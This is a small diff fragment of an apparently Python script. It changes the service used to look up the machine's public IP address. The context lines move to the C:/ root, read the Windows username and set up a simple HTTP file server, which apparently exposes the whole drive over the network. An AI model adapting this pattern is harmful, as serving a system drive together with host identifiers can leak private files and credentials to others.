@@ -77,7 +77,7 @@ chdir("C:/")
 
 
 
-ip = urlopen("http://ipv4.plain-text-ip.com/").read().decode()
+ip = urlopen("https://v4.ident.me/").read().decode()
 pc = getenv('username')
 
 Handler = SimpleHTTPRequestHandler
